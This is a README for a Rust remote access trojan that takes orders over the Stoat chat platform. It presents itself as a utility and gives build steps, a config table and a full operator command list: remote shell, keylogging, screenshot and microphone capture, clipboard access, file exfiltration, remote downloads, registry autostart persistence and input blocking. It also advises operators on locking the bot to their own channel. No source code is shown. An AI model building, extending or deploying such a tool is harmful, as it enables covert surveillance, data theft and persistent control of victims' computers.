# stoat-rat

Rust C2 agent controlled over **Stoat** (formerly Revolt). The agent authenticates to the Stoat bot gateway, listens on a control channel, executes commands, and returns output/files as Stoat messages and attachments.

> Category: `tools-and-utilities`

## Tech Stack

- **Rust** (edition 2021), `tokio` async runtime
- `tokio-tungstenite` — Stoat gateway websocket (`wss://events.stoat.chat`)
- `reqwest` — Stoat REST + Autumn file upload (`rustls`)
- `xcap` + `image` — screen capture → JPEG
- `cpal` + `hound` — microphone capture → WAV
- `windows-sys` — low-level input hooks, `BlockInput`, message box, monitor power
- `sysinfo`, `arboard`, `winreg` — host info, clipboard, autostart

## Build

```powershell
cargo build --release
# -> target\release\stoat-rat.exe
```

## Run

```powershell
.\target\release\stoat-rat.exe
```

Configuration resolves from `config.json` beside the exe, then environment overrides:

| key | env | default |
|---|---|---|
| `token` | `STOAT_TOKEN` | (built-in bot token) |
| `api` | `STOAT_API` | `https://api.stoat.chat` |
| `ws` | `STOAT_WS` | `wss://events.stoat.chat` |
| `autumn` | `STOAT_AUTUMN` | `https://cdn.stoatusercontent.com` |
| `channel` | `STOAT_CHANNEL` | any channel the bot sees |
| `operator` | `STOAT_OPERATOR` | any author |
| `prefix` | — | `!` |

Set `channel` and `operator` in production so only your control channel and user id are accepted.

## Command Surface

| command | action |
|---|---|
| `!help` | list commands |
| `!sysinfo` | host / os / cpu / memory |
| `!shell <cmd>` | `cmd.exe /C`, returns output |
| `!exec <exe> [args]` | launch detached |
| `!ps` / `!kill <pid>` | process list / terminate |
| `!screenshot` | primary monitor → JPEG |
| `!mic <secs>` | default mic → WAV |
| `!freeze` / `!unfreeze` | block mouse + keyboard |
| `!keylog start\|stop\|dump\|clear` | keystroke capture |
| `!clipboard [text]` | get / set clipboard |
| `!ls [path]` | directory listing |
| `!getfile <path>` | exfiltrate a local file |
| `!putfile [dest]` | save the message's attachment |
| `!download <url> [dest]` | pull a remote file |
| `!persist` / `!unpersist` | `HKCU\...\Run` autostart |
| `!msg <text>` | message box |
| `!monitor on\|off` | display power |
| `!lock` | lock workstation |
| `!exit` | terminate agent |

## Project Layout

```
stoat-rat/
  src/            # agent source
  docs/           # architecture and protocol notes
  tests/          # integration tests
  .agents/rules/  # project context for agents
```

See `docs/ARCHITECTURE.md` for the module map and C2 data flow.
